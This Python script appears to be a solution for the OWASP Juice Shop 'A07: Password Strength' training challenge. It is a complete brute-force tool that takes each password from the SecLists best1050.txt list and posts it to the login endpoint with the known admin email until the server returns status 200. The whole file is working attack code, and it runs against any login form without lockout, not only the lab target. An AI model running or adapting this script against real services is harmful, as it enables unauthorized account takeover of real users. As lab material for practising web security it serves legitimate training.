# For the A07:Password Strength - challenge
# pip install requests
import requests

# https://github.com/danielmiessler/SecLists
# https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/best1050.txt
# Bigger files on https://haveibeenpwned.com/Passwords

# define the webpage you want to crack
url = "*juice-shop-url*/rest/user/login/"

# We know the admin user name
email = "admin@juice-sh.op"
# Get value from the initial login request. Replace "COOKIE VALUE HERE" with that value.
cookies = {'__Secure-balancer': 'COOKIE VALUE HERE'}

# Find a password file - e.g.
# open the password file in read mode
file = open("best1050.txt", "r")

# now let's get each password in the password_file
for password in file.readlines():
    # let's strip it of any \n
    password = password.strip("\n")

    # collect the data needed from "inspect element"
    data = {'email':email, 'password':password}
    print("[*] Attempting password: %s" % password)
    send_data_url = requests.post(url, data=data, cookies=cookies)

    if send_data_url.status_code == 200:
        print("[*] Password found: %s " % password)
        print(send_data_url.content)
        break